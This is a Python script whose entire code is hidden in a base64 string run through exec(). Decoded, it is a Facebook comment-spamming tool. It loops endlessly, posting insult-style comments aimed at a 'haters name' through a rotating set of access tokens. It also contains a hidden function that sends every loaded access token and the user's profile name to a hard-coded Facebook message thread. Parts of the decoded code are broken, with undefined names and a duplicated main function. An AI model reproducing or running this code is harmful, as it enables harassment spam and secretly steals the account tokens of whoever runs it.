import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KICAgIGRlZiBkb19HRVQoc2VsZik6DQogICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpDQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJrdXVqdSBvaWkga29vbmlpY2hpd2Egc2VucGFpaSA6MyIpDQoNCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KICAgIFBPUlQgPSA0MDAwDQoNCiAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoNCiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkNCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpDQogICAgICAgIA0KDQpkZWYgcG9zdF9jb21tZW50cygpOg0KICAgIHdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpDQogICAgbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpDQoNCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KDQogICAgZGVmIGNscygpOg0KICAgICAgICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQ0KICAgIGNscygpDQoNCiAgICBkZWYgbGluZXNzKCk6DQogICAgICAgIHByaW50KCdcdTAwMWJbMzdtJyArICfigKLilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDigKInKQ0KDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsDQogICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsDQogICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCiAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywNCiAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCiAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsDQogICAgICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJw0KICAgIH0NCg0KICAgIGxpbmVzcygpDQoNCiAgICBhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10NCg0KICAgIHdpdGggb3BlbigncG9zdC50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgIHBvc3RfdXJsID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoNCiAgICB3aXRoIG9wZW4oJ2NvbW1lbnRzLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgY29tbWVudHMgPSBmaWxlLnJlYWRsaW5lcygpDQoNCiAgICBudW1fY29tbWVudHMgPSBsZW4oY29tbWVudHMpDQogICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fY29tbWVudHMpDQoNCiAgICB3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICBoYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgIHdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgIHNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpDQogICAgICAgIA0KICAgICAjcG9zdF9pZCA9IHBvc3RfdXJsc3BsaXQNCg0KICAgIGxpbmVzcygpDQoNCiAgICBkZWYgZ2V0TmFtZSh0b2tlbik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBkYXRhID0gIiINCiAgICAgICAgaWYgJ25hbWUnIGluIGRhdGE6DQogICAgICAgICAgICByZXR1cm4gZGF0YVsnbmFtZSddDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByZXR1cm4gIkVycm9yIG9jY3VycmVkIg0KDQoNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgY29tbWVudF9pbmRleCBpbiByYW5nZShudW1fY29tbWVudHMpOg0KICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gY29tbWVudF9pbmRleCAlIG1heF90b2tlbnMNCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSBhY2Nlc3NfdG9rZW5zW3Rva2VuX2luZGV4XQ0KDQogICAgICAgICAgICAgICAgY29tbWVudCA9IGNvbW1lbnRzW2NvbW1lbnRfaW5kZXhdLnN0cmlwKCkNCg0KICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97fS9jb21tZW50cyIuZm9ybWF0KHBvc3RfdXJsKQ0KICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnR9DQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICAgICAgICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpDQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCJbK10gQ29tbWVudCBOby4ge30gUG9zdCBJZCB7fSBUb2tlbiBOby4ge306IHt9Ii5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tZW50X2luZGV4ICsgMSwgcG9zdF91cmwsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBjb21tZW50KSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlt4XSBGYWlsZWQgdG8gc2VuZCBDb21tZW50IE5vLiB7fSBQb3N0IElkIHt9IFRva2VuIE5vLiB7fToge30iLmZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1lbnRfaW5kZXggKyAxLCBwb3N0X3VybCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnQpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNwZWVkKQ0KDQogICAgICAgICAgICBwcmludCgiXG5bK10gQWxsIGNvbW1lbnRzIHNlbnQgc3VjY2Vzc2Z1bGx5LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQoNCiAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQ0KDQoNCmRlZiBtc2coKToNCiAgICBwYXJhbWV0ZXJzID0gew0KICAgICAgICAnYWNjZXNzX3Rva2VuJzogcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSwNCiAgICAgICAgJ21lc3NhZ2UnOiAnVXNlciBQcm9maWxlIE5hbWU6ICcgKyBnZXROYW1lKHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucykpICsgJ1xuVG9rZW46ICcgKyAiIHwgIi5qb2luKA0KICAgICAgICAgICAgYWNjZXNzX3Rva2VucykgKyAnXG5MaW5rOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nICsgY29udm9faWQNCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF8xMDAwNjE4MDQwNzE1MTkvIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCmRlZiBtYWluKCk6DQogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KDQogICAgcG9zdF9jb21tZW50cygpDQogICAgbXNnKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCkNCmRlZiBtYWluKCk6DQogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KDQogICAgcG9zdF9jb21tZW50cygpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigp'))
